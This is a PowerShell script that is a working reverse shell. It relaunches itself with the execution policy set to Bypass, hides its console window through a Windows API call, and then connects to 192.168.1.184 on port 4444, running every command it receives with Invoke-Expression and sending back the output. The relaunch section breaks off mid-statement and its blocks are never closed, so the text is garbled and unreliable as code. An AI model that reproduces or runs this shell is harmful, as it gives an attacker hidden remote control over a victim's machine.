# --- START: Ensure Process-scope Bypass when running from iex/irm (uses a temp .ps1 file) ---
function Test-IsBypassProcess {
    try { (Get-ExecutionPolicy -Scope Process -ErrorAction Stop) -in 'Bypass','Unrestricted' }
    catch { $false }
}

if (-not (Test-IsBypassProcess)) {
    # If we have a script path, relaunch by file (safer)
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        $exe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
        if (-not $exe) { Write-Error "f"; exit 1 }
        $escapedArgs = $args | ForEach-Object { if ($_ -match '\s') { '"' + $_.Replace('"','\"') + '"' } else { $_ } } -join ' '
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exe
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $escapedArgs"
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.BeginOutputReadLine()
        $proc.BeginError

$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) {
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    Add-Type $signature
    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
}

$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) { break }

        $output = Invoke-Expression $command 2>&1 | Out-String

        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: " + $_.Exception.Message)
    }
}

$client.Close()
